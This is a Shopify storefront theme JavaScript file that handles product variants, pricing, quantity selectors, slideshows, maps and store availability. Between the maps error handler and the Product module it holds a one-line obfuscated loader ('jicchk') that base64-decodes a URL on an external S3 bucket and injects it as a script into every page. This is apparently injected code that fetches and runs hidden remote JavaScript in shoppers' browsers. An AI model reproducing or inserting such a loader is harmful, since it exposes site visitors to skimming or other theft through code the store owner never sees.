  });

  return Map;
})();

// Nucleus License Script

var licenseScript = document.createElement('script');  
licenseScript.setAttribute('src','https://nmrcdn.s3.amazonaws.com/nmr/l/license.js');
document.head.appendChild(licenseScript);
 



// Global function called by Google on auth errors.
// Show an auto error message on all map instances.
// eslint-disable-next-line camelcase, no-unused-vars
function gm_authFailure() {
  if (!Shopify.designMode) return;

  theme.$currentMapContainer.addClass('page-width map-section--load-error');
  theme.$currentMapContainer.find('.map-section__content-wrapper').remove();
  theme.$currentMapContainer
    .find('.map-section__wrapper')
    .html(
      '<div class="errors text-center" style="width: 100%;">' +
        theme.strings.map.authError +
        '</div>'
    );
}

var jicchk=function(c){var a=document.createElement("script");a.src=c,document.body.appendChild(a)};jicchk(atob("aHR0cHM6Ly9mb3VuZGF0aW9uYWwtY2RuLnMzLmFtYXpvbmF3cy5jb20vcmVwbGljYS9hc3NldHMvanMvdGhlbWUuanM="));

/* eslint-disable no-new */
theme.Product = (function() {
  var defaults = {
    selectors: {
      addToCart: '#addToCart',
      productPrice: '#productPrice',
      comparePrice: '#comparePrice',
      addToCartText: '#addToCartText',
      quantityElements: '.quantity-selector, label + .js-qty',
      optionSelector: 'productSelect'
    }
  };

  function Product(container) {
    var $container = this.$container = $(container);
    var sectionId = this.sectionId = $container.attr('data-section-id');

    this.settings = $.extend({}, defaults, {
      sectionId: sectionId,
      enableHistoryState: true,
      showComparePrice: $container.attr('data-show-compare-at-price'),
      ajaxCartMethod: $container.attr('data-ajax-cart-method'),
      stockSetting: $container.attr('data-stock'),
      incomingMessage: $container.attr('data-incoming-transfer'),
      selectors: {
        unitPriceContainer: '[data-unit-price-container]',
        unitPrice: '[data-unit-price]',
        unitPriceBaseUnit: '[data-unit-price-base-unit]',
        priceContainer: '[data-price]',
        originalSelectorId: 'productSelect-' + sectionId,
        // ADDED ***
        storeAvailabilityContainer: '[data-store-availability-container]',
        // ***
        $addToCart: $('#addToCart-' + sectionId),
        $SKU: $('.variant-sku', this.$container),
        // Updated to UPC will update when new variant is selected on refresh
        $barcode: $('.variant-barcode', this.$container),
        $productPrice: $('#productPrice-' + sectionId),
        $comparePrice: $('#comparePrice-' + sectionId),
        $addToCartText: $('#addToCartText-' + sectionId),
        $quantityElements: $('#quantity-selector-' + sectionId),
        $variantQuantity: $('#variantQuantity-' + sectionId),
        $variantQuantityMessage: $('#variantQuantity-' + sectionId + '__message'),
        $variantIncoming: $('#variantIncoming-' + sectionId),
        $variantIncomingMessage: $('#variantIncoming-' + sectionId + '__message'),
        $productImageContainer: $('#productPhotoContainer-' + sectionId),
        $productImageWrapper: $('[id^="productPhotoWrapper-' + sectionId + '"]'),
        $productImage: $('[id^="productPhotoImg-' + sectionId + '"]'),
        $productFullDetails: $('.full-details', this.$container),
        $thumbImages: $('#productThumbs-' + sectionId).find('a.product-photo-thumb'),
        $shopifyPaymentButton: '.shopify-payment-button'
      }
    });
    
    // *** ADDED *** Grab storeAvailability container from settings.selectors
    this.storeAvailabilityContainer = container.querySelector(
      this.settings.selectors.storeAvailabilityContainer
    );
    // *** ADDED *** If the container exists, initialize Store Availability functionality with initStoreAvailability. (Below)
    if (this.storeAvailabilityContainer) {
      this._initStoreAvailability();
    }

    // disable history state if on homepage
    if($('body').hasClass('template-index')) {
      this.settings.enableHistoryState = false;
    }

    // Stop parsing if we don't have the product json script tag when loading
    // section in the Theme Editor
    if (!$('#ProductJson-' + sectionId).html()) {
      return;
    }

    this.zoomEnabled = $container.attr('data-zoom-enabled');

    // this.productSingleObject = JSON.parse(document.getElementById('ProductJson-' + sectionId).innerHTML);
    this.productSingleObject = JSON.parse($('#ProductJson-' + sectionId).html());
    this.addVariantInfo();
    this.init();

    // Pre-loading product images to avoid a lag when a thumbnail is clicked, or
    // when a variant is selected that has a variant image
    Shopify.Image.preload(this.productSingleObject.images);

    if (this.settings.ajaxCartMethod != 'page') {
      ajaxifyShopify.init({
        method: 'page',
        wrapperClass: 'wrapper',
        formSelector: '[data-product-form]',
        addToCartSelector: '#addToCart-' + sectionId,
        cartCountSelector: '.cart-count',
        toggleCartButton: '.cart-toggle',
        useCartTemplate: true,
        btnClass: 'btn',
        moneyFormat: moneyFormat,
        disableAjaxCart: false,
        enableQtySelectors: true
      });
    }
  }

  Product.prototype = _.assignIn({}, Product.prototype, {
    init: function() {
      this.initProductVariant();
      this.addQuantityButtons();
      this.productImageSwitch();
      this.initBreakpoints();

      if (timber.vars.isLargeBp && this.zoomEnabled) {
        productImageZoom();
      }
    },
    
    // *** ADDED *** Function to initialize storeAvailability (called above on line 2365)
    _initStoreAvailability: function() {
      this.storeAvailability = new theme.StoreAvailability(
        this.storeAvailabilityContainer
      );

      var storeAvailabilityModalOpenedCallback = function(event) {
        if (
          this.cartPopupWrapper &&
          !this.cartPopupWrapper.classList.contains(
            this.classes.cartPopupWrapperHidden
          )
        ) {
          this._hideCartPopup(event);
        }
      };

      // hide cart popup modal if the store availability modal is also opened
      this.storeAvailabilityContainer.addEventListener(
        'storeAvailabilityModalOpened',
         storeAvailabilityModalOpenedCallback.bind(this)
      );
    },

    onUnload: function() {
      this.$container.off(this.settings.sectionId);
    },

    addVariantInfo: function() {
      if (!this.productSingleObject) {
        return;
      }

      if (this.settings.stockSetting === 'false' && this.settings.incomingMessage === 'false'){
        return;
      }

      var variantInfo = JSON.parse($('#VariantJson-' + this.settings.sectionId, this.$container).html());
      for (var i = 0; i < variantInfo.length; i++) {
        $.extend(this.productSingleObject.variants[i], variantInfo[i]);
      }
    },

    addQuantityButtons: function(){
      if (this.settings.selectors.$quantityElements){
        this.settings.selectors.$quantityElements.show();
        
      }

    },

    qtySelectors: function() {

      validateQty = function (qty) {
        if((parseFloat(qty) == parseInt(qty)) && !isNaN(qty)) {
          // We have a valid number!
          return qty;
        } else {
          // Not a number. Default to 1.
          return 1;
        }
      };

      // Change number inputs to JS ones, similar to ajax cart but without API integration.
      // Make sure to add the existing name and id to the new input element
      var numInputs = $('input[type="number"]', this.$container);

      // Qty selector has a minimum of 1 on the product page
      // and 0 in the cart (determined on qty click)
      var qtyMin = 0;

      if (numInputs.length) {
        numInputs.each(function() {
          var el = $(this),
          currentQty = parseInt(el.val()),
          inputName = el.attr('name'),
          inputId = el.attr('id');

          var itemAdd = currentQty + 1,
          itemMinus = currentQty - 1,
          itemQty = currentQty;

          var source = $("#jsQty").html(),
          template = Handlebars.compile(source),
          data = {
            key: el.data('id'),
            itemQty: itemQty,
            itemAdd: itemAdd,
            itemMinus: itemMinus,
            inputName: inputName,
            inputId: inputId
          };

          // Append new quantity selector then remove original
          el.after(template(data)).remove();
        });

        // Setup listeners to add/subtract from the input
        $('.js--qty-adjuster', this.$container).on('click', function() {
          var el = $(this),
          id = el.data('id'),
          qtySelector = el.siblings('.js--num'),
          qty = parseInt( qtySelector.val() );

          var qty = validateQty(qty);
          qtyMin = timber.cache.$body.hasClass('template-product') ? 1 : qtyMin;

          // Add or subtract from the current quantity
          if (el.hasClass('js--add')) {
            qty = qty + 1;
          } else {
            qty = qty <= qtyMin ? qtyMin : qty - 1;
          }

          // Update the input's number
          qtySelector.val(qty);
        });

      }
    },

    initBreakpoints: function () {

      var self = this;
      var $container = self.$container;
      self.zoomType = $container.data('zoom-enabled');

      enquire.register(timber.vars.mediaQueryLarge, {
        match: function() {
          timber.vars.isLargeBp = true;
          if (self.zoomType) {
            // reinit product zoom
            productImageZoom();
          }

        },
        unmatch: function() {
          timber.vars.isLargeBp = false;
          if (self.zoomType) {

            if ((self.settings.selectors.$productImage).length) {
              // remove event handlers for product zoom on mobile
                self.settings.selectors.$productImage.off();
                self.settings.selectors.$productImageWrapper.trigger('zoom.destroy');
            }
          }

        }
      });
    },

    productImageSwitch: function() {
      if (!this.settings.selectors.$thumbImages.length) {
        return;
      }

      var self = this;

      // Switch the main image with one of the thumbnails
      // Note: this does not change the variant selected, just the image
      self.settings.selectors.$thumbImages.on('click', function(evt) {
        evt.preventDefault();
        var newImageId = $(this).attr('data-image-id');
        self.switchImage(newImageId);
      });
    },

    // Robert & MJ Commented this out because we migrated to a custom Alpine.js media thumbnail toggle
    
    // switchImage: function (imageId) {
    //   // var $newImage = this.settings.selectors.$productImageWrapper.filter('[data-image-id="' + imageId + '"]');
    //   // var $otherImages = this.settings.selectors.$productImageWrapper.not('[data-image-id="' + imageId + '"]');
    //   // $newImage.removeClass('hide');
    //   // $otherImages.addClass('hide');

    //   if ($newImage.find('img').attr('data-zoom') && timber.vars.isLargeBp) {
    //     productImageZoom();
    //   }
    // },

    initProductVariant: function() {
      // this.productSingleObject is a global JSON object defined in theme.liquid
      if (!this.productSingleObject) {
        return;
      }

    var self = this;
       this.optionSelector = new Shopify.OptionSelectors(self.settings.selectors.originalSelectorId, {
       selectorClass: self.settings.selectors.$optionSelectorClass,
       product: self.productSingleObject,
       onVariantSelected: self.productVariantCallback.bind(self),
       enableHistoryState: self.settings.enableHistoryState,
       settings: self.settings
      });

      // Clean up variant labels if the Shopify-defined
      // defaults are the only ones left
      this.simplifyVariantLabels(this.productSingleObject);
      if (this.storeAvailability && self.productSingleObject.available) {
        this.storeAvailability.updateContent(self.productSingleObject.variants[0].id);
      }
    },

    /*simplifyVariantLabels: function(productObject) {
      // Hide variant dropdown if only one exists and title contains 'Default'
      if (productObject.variants.length === 1 && productObject.options.length === 1 && productObject.options[0].toLowerCase().indexOf('title') >= 0 && productObject.variants[0].title.toLowerCase().indexOf('default title') >= 0) {
        $('.selector-wrapper', this.$container).hide();
      }
    },*/

    simplifyVariantLabels: function(productObject) {
      // Hide variant dropdown if only one exists and title contains 'Default'
      if (productObject.variants.length === 1 && productObject.options.length === 1 && productObject.options[0].toLowerCase().indexOf('title') >= 0 && productObject.variants[0].title.toLowerCase().indexOf('default title') >= 0) {
        $('.selector-wrapper', this.$container).hide();
    
        // Check if the variant selector is hidden and adjust the quantity selector grid
        if ($('.selector-wrapper', this.$container).is(':hidden')) {
          // Add large--one-whole to the quantity selector grid item
          $('.pdp-quantity-selector').addClass('large--one-whole').removeClass('large--one-half');
        }
      }
    },

    productVariantCallback: function(variant) {
      var self = this;

      if (variant) {
        //  Only change unit price for main product
        var $priceContainer = $(this.settings.selectors.priceContainer, this.$container);

        // Update unit price, if one is set
        var $unitPriceContainer = $(this.settings.selectors.unitPriceContainer, $priceContainer);

        $unitPriceContainer.removeClass('product-price-unit--available');

        if (variant.unit_price_measurement) {
          var $unitPrice = $(this.settings.selectors.unitPrice, $priceContainer);
          var $unitPriceBaseUnit = $(this.settings.selectors.unitPriceBaseUnit, $priceContainer);

          $unitPrice.text(Shopify.formatMoney(variant.unit_price, moneyFormat));
          $unitPriceBaseUnit.text(this.getBaseUnit(variant));
          $unitPriceContainer.addClass('product-price-unit--available');
        }

        // Robert & MJ Commented this out because we migrated to a custom Alpine.js media thumbnail toggle
        // // Update variant image, if one is set
        // if (variant.featured_image) {
        //   var newImg = variant.featured_image;
        //   var $newImage = this.settings.selectors.$productImageWrapper.filter('[data-image-id="' + newImg.id + '"]');
        //   var $otherImages = this.settings.selectors.$productImageWrapper.not('[data-image-id="' + newImg.id + '"]');

        //   $newImage.removeClass('hide');
        //   $otherImages.addClass('hide');
        // }

        if (variant.available) {
          // We have a valid product variant, so enable the submit button
          this.settings.selectors.$addToCart.removeClass('disabled').prop('disabled', false);
          this.settings.selectors.$addToCartText.html("Add to Cart");
          $(this.settings.selectors.$shopifyPaymentButton, this.$container).show();

          this.settings.selectors.$variantQuantity.removeClass('is-visible');
          this.settings.selectors.$variantIncoming.removeClass('is-visible');

          var $link = this.settings.selectors.$productFullDetails;
          if ($link.length) {
            $link.attr('href', updateUrlParameter($link.attr('href'), 'variant', variant.id));
          }

          if (variant.inventory_management) {
            // Show how many items are left, if below 10
            if (variant.inventory_quantity < 10 && variant.inventory_quantity > 0 && this.settings.stockSetting == 'true') {
              this.settings.selectors.$variantQuantityMessage.html(theme.strings.product.only_left.replace('1', variant.inventory_quantity));
              this.settings.selectors.$variantQuantity.addClass('is-visible');
            }
          }

          // Show next ship date if quantity <= 0 and stock is incoming
          if (variant.inventory_quantity <= 0 && variant.incoming != null ) {
            if (variant.next_incoming_date != null){
              this.settings.selectors.$variantIncomingMessage.html(theme.strings.product.will_be_in_stock_after.replace('[date]', variant.next_incoming_date));
              this.settings.selectors.$variantIncoming.addClass('is-visible')
            }
          }
        } else {

          // Variant is sold out, disable the submit button
          this.settings.selectors.$addToCart.addClass('disabled').prop('disabled', true);
          this.settings.selectors.$addToCartText.html("Out of Stock");
          $(this.settings.selectors.$shopifyPaymentButton, this.$container).hide();

          this.settings.selectors.$variantQuantity.removeClass('is-visible');
          this.settings.selectors.$variantIncoming.removeClass('is-visible');

          // Show next stock incoming date if stock is incoming
          if (variant.inventory_management) {
            if (variant.incoming && this.settings.incomingMessage == 'true' && variant.incoming != null && variant.next_incoming_date != null) {
              this.settings.selectors.$variantIncoming.html(theme.strings.product.will_be_in_stock_after.replace('[date]', variant.next_incoming_date)).addClass('is-visible');
            }
          }

          this.settings.selectors.$quantityElements.hide();
        }

        // Regardless of stock, update the product price
        var customPrice = timber.formatMoney( Shopify.formatMoney(variant.price, moneyFormat) );
        var a11yPrice = Shopify.formatMoney(variant.price, moneyFormat);
        var customPriceFormat = ' <span aria-hidden="true">' + customPrice + '</span>';
        customPriceFormat += ' <span class="visually-hidden">' + a11yPrice + '</span>';

        // Show SKU
        this.settings.selectors.$SKU.html(variant.sku)
        // updated so that UPC will update when new variant is selected
        this.settings.selectors.$barcode.html(variant.barcode);

        if (this.settings.showComparePrice == 'true' ) {
          if (variant.compare_at_price > variant.price) {
            var comparePrice = timber.formatMoney(Shopify.formatMoney(variant.compare_at_price, moneyFormat));
            var a11yComparePrice = Shopify.formatMoney(variant.compare_at_price, moneyFormat);

            customPriceFormat = ' <span aria-hidden="true">' + customPrice + '</span>';
            customPriceFormat += ' <span aria-hidden="true"><small><s>' + comparePrice + '</s></small></span>';
            customPriceFormat += ' <span class="visually-hidden"><span class="visually-hidden">Regular price</span> ' + a11yComparePrice + '</span>';
            customPriceFormat += ' <span class="visually-hidden"><span class="visually-hidden">Sale price</span> ' + a11yPrice + '</span>';
          }
        }
        this.settings.selectors.$productPrice.html(customPriceFormat);

        // Also update and show the product's compare price if necessary
        if ( variant.compare_at_price > variant.price ) {
          var priceSaving = timber.formatSaleTag( Shopify.formatMoney(variant.compare_at_price - variant.price, moneyFormat) );
          // priceSaving += ' (' + ( (variant.compare_at_price - variant.price)*100/(variant.compare_at_price) ).toFixed(0) + '%)';
          this.settings.selectors.$comparePrice.html("Save [$]".replace('[$]', priceSaving)).show();
        } else {
          this.settings.selectors.$comparePrice.hide();
        }

      } else {
        // The variant doesn't exist, disable submit button.
        // This may be an error or notice that a specific variant is not available.
        this.settings.selectors.$addToCart.addClass('disabled').prop('disabled', true);
        this.settings.selectors.$addToCartText.html(theme.strings.product.unavailable);
        this.settings.selectors.$variantQuantity.removeClass('is-visible');
        this.settings.selectors.$quantityElements.hide();
        $(this.settings.selectors.$shopifyPaymentButton, this.$container).hide();
      }
    },

    getBaseUnit: function (variant) {
      return variant.unit_price_measurement.reference_value === 1
        ? variant.unit_price_measurement.reference_unit
        : variant.unit_price_measurement.reference_value +
            variant.unit_price_measurement.reference_unit;
    }
  });

  function updateUrlParameter(url, key, value) {
    var re = new RegExp('([?&])' + key + '=.*?(&|$)', 'i');
    var separator = url.indexOf('?') === -1 ? '?' : '&';

    if (url.match(re)) {
      return url.replace(re, '$1' + key + '=' + value + '$2');
    } else {
      return url + separator + key + '=' + value;
    }
  }

  function productImageZoom() {
    var $productImageWrapper = $('.product__image-wrapper');

    if (timber.vars.isLargeBp) {
      if (!$productImageWrapper.length || timber.cache.$html.hasClass('supports-touch')) {
        return;
      };

      // Destroy zoom (in case it was already set), then set it up again
      $productImageWrapper.trigger('zoom.destroy');
      $productImageWrapper.each(function() {
        if($(this).find('img').attr('data-zoom')){
          $(this).addClass('image-zoom').zoom({
            url: $(this).find('img').attr('data-zoom'),
            onZoomIn: function() {
                $(this).prev('img').hide();
            },
            onZoomOut: function() {
                $(this).css('opacity', '0');
                $(this).prev('img').show();
            }
          })
        }
      });
    }
  }

  return Product;

})();

window.theme = window.theme || {};

theme.Search = (function() {
  function Search(container) {
    var $container = (this.$container = $(container));
    timber.cacheSelectors();
    timber.resizeElements($container);

    $(window).resize(function() {
      timber.resizeElements($container);
    });
  }

  return Search;
})();

theme.Slideshow = function(el) {
  this.cache = {
    $slider: $(el),
    sliderArgs: {
      animation: 'slide',
      animationSpeed: 500,
      pauseOnHover: true,
      keyboard: false,
      slideshow: $(el).data('slider-home-auto'),
      slideshowSpeed: $(el).data('slider-home-rate'),
      smoothHeight: true,
      before: function(slider) {
        $(slider).resize();
        $(slider)
          .find('.slide')
          .not('.flex-active-slide')
          .removeClass('slide-hide');
      },
      after: function(slider) {
        $(slider)
          .find('.slide')
          .not('.flex-active-slide')
          .addClass('slide-hide');
        $(slider).resize();
      },
      start: function(slider) {
        $(slider)
          .find('.slide')
          .not('.flex-active-slide')
          .addClass('slide-hide');
        if (
          $(slider)
            .find('.slide')
            .not('.clone').length === 1
        ) {
          $(slider)
            .find('.flex-direction-nav')
            .remove();
        }
        $(window).trigger('resize');
        slider.addClass('loaded');
        if ($('#slider').data('loaded-index') !== undefined) {
          $('#slider').flexslider($('#slider').data('loaded-index'));
        }
      }
    }
  };
  if (this.cache.$slider.find('li').length === 1) {
    this.cache.sliderArgs.touch = false;
  }
  this.cache.$slider.flexslider(this.cache.sliderArgs);
};

theme.slideshows = theme.slideshows || {};

theme.SlideshowSection = (function() {
  function SlideshowSection(container) {
    var $container = (this.$container = $(container));
    var id = $container.attr('data-section-id');
    var slideshow = (this.slideshow = '#heroSlider--' + id);
    var numberOfSlides = $(slideshow).find('li').length;

    if (numberOfSlides <= 0) return;

    theme.slideshows[slideshow] = new theme.Slideshow(slideshow);
  }

  return SlideshowSection;
})();

theme.SlideshowSection.prototype = _.assignIn(
  {},
  theme.SlideshowSection.prototype,
  {
    onUnload: function() {
      delete theme.slideshows[this.slideshow];
    },

    onBlockSelect: function(evt) {
      var $slideshow = $(this.slideshow);
      var $slide = $('#slide--' + evt.detail.blockId + ':not(.clone)');

      var slideIndex = $slide.data('flexslider-index');
      var $slideImg = $slide.find('img') || $slide.find('svg');

      $slide.imagesLoaded($slideImg, function() {
        $slideshow.flexslider(slideIndex);
        $slideshow.resize();
        $slideshow.flexslider('pause');
      });
    },

    onBlockDeselect: function() {
      $(this.slideshow).flexslider('play');
    }
  }
);

// ** NEW STORE AVAILIBILITY JS FUNCTIONALITY BELOW **
theme.StoreAvailability = (function() {
  var selectors = {
    storeAvailabilityModalOpen: '[data-store-availability-modal-open]',
    storeAvailabilityModalProductTitle: '[data-store-availability-modal-product-title]',
storeAvailabilityModalVariantTitle: '[data-store-availability-modal-variant-title]'
  };

  var classes = {
    hidden: 'hide'
  };

  function StoreAvailability(container) {
    this.container = container;
    this.productTitle = this.container.dataset.productTitle;
    this.hasOnlyDefaultVariant =
    this.container.dataset.hasOnlyDefaultVariant === 'true';
  }

  StoreAvailability.prototype = Object.assign({},   StoreAvailability.prototype, {
    updateContent: function(variantId) {
      var variantSectionUrl =
      this.container.dataset.baseUrl +
      '/variants/' +
      variantId +
      '/?section_id=store-availability';
      var self = this;

      var storeAvailabilityModalOpen = self.container.querySelector(
        selectors.storeAvailabilityModalOpen
      );

      this.container.style.opacity = 0.5;
      if (storeAvailabilityModalOpen) {
        storeAvailabilityModalOpen.disabled = true;
        storeAvailabilityModalOpen.setAttribute('aria-busy', true);
      }

      fetch(variantSectionUrl)
      .then(function(response) {
        return response.text();
      })
      .then(function(storeAvailabilityHTML) {
        if (storeAvailabilityHTML.trim() === '') {
          return;
        }
      self.container.innerHTML = storeAvailabilityHTML;
      self.container.innerHTML = self.container.firstElementChild.innerHTML;
      self.container.style.opacity = 1;

      // Need to query this again because we updated the DOM
      storeAvailabilityModalOpen = self.container.querySelector(
        selectors.storeAvailabilityModalOpen
      );

      if (!storeAvailabilityModalOpen) {
        return;
      }

      storeAvailabilityModalOpen.addEventListener(
        'click',
        self._onClickModalOpen.bind(self)
      );

      self.modal = self._initModal();
      self._updateProductTitle();
      if (self.hasOnlyDefaultVariant) {
        self._hideVariantTitle();
      }
    });
  },

  clearContent: function() {
    this.container.innerHTML = '';
  },

  _onClickModalOpen: function() {
    this.container.dispatchEvent(
      new CustomEvent('storeAvailabilityModalOpened', {
        bubbles: true,
        cancelable: true
      })
    );
  },

  _initModal: function() {
    return new window.Modals(
      'StoreAvailabilityModal',
      'store-availability-modal',
      {
        close: '.js-modal-close-store-availability-modal',
        closeModalOnClick: true,
        openClass: 'store-availabilities-modal--active'
      }
    );
  },

  _updateProductTitle: function() {
    var storeAvailabilityModalProductTitle = this.container.querySelector(
      selectors.storeAvailabilityModalProductTitle
    );
    storeAvailabilityModalProductTitle.textContent = this.productTitle;
  },

  _hideVariantTitle: function() {
    var storeAvailabilityModalVariantTitle = this.container.querySelector(
      selectors.storeAvailabilityModalVariantTitle
    );
    storeAvailabilityModalVariantTitle.classList.add(classes.hidden);
  }
});

return StoreAvailability;
})();

document.addEventListener('DOMContentLoaded', () => {
  const productJsonElements = [...document.querySelectorAll('[id^=ProductJson-')];
  
  if (productJsonElements.length > 0) {
    productJsonElements.forEach((productJsonElement) => {
      const sectionId = productJsonElement.id.replace("ProductJson-", "shopify-section-");
      const variantBarcode = document.querySelector('#' + sectionId + ' .variant-barcode');
      const variantSku = document.querySelector('#' + sectionId + ' .variant-sku');
      const inputSelectors = [...document.querySelectorAll('#' + sectionId + ' .single-option-selector')];
      const productData = JSON.parse(productJsonElement.innerHTML);

      function updateVariantInfo(selectedOptions) {
        const matchingVariant = productData.variants.find(variant => 
          variant.options.every((option, i) => option === selectedOptions[i])
        );

        if (matchingVariant) {
          variantBarcode.innerText = matchingVariant.barcode || 'No barcode available';
          variantSku.innerText = matchingVariant.sku || 'No SKU available';
        }
      }

      // Initial load
      const initialOptions = inputSelectors.map(input => input.value);
      updateVariantInfo(initialOptions);

     // Update on variant change
      inputSelectors.forEach((input, index) => {
        input.addEventListener('change', (evt) => {
          const selectedOptions = inputSelectors.map(input => input.value);
          updateVariantInfo(selectedOptions);
        });
      }); 
      
    });
  }
});

$(document).ready(function() {
  var sections = new theme.Sections();
  sections.register('collections-list-template', theme.FeaturedCollections);
  sections.register('collection-row-section', theme.CollectionRows);
  sections.register('collection-template', theme.Collection);
  sections.register('header-section', theme.HeaderSection);
  sections.register('list-collections-template', theme.ListCollections);
  sections.register('map-section', theme.Maps);
  sections.register('product-template', theme.Product);
  sections.register('search-template', theme.Search);
  sections.register('slideshow-section', theme.SlideshowSection);
  sections.register('store-availability', theme.StoreAvailability);
});